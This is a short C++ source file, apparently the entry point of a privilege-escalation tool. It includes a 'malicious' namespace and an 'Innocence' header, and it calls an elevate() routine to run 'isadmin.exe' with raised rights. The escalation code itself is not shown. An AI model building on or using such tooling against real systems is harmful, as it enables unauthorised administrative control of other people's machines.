#include <log/Log.hpp>
using namespace Common;

#include <system/Process.hpp>
#include <common/Innocence.hpp>

#include <malicious/Elevator.hpp>
using namespace Malicious;

int main(int argc, char *argv[])
{
	try
	{
		LOG.setIdentity(Common::identity);
		LOG.addObserver(new Log::LogToCollector);
		System::Process::This thisProcess;
		return elevate(thisProcess.getProgramDir()+"\\isadmin.exe");
    }
    catch(Common::Exception&)
    {
    }
	CATCH_UNKNOWN_EXCEPTION
	return EXIT_FAILURE;
}
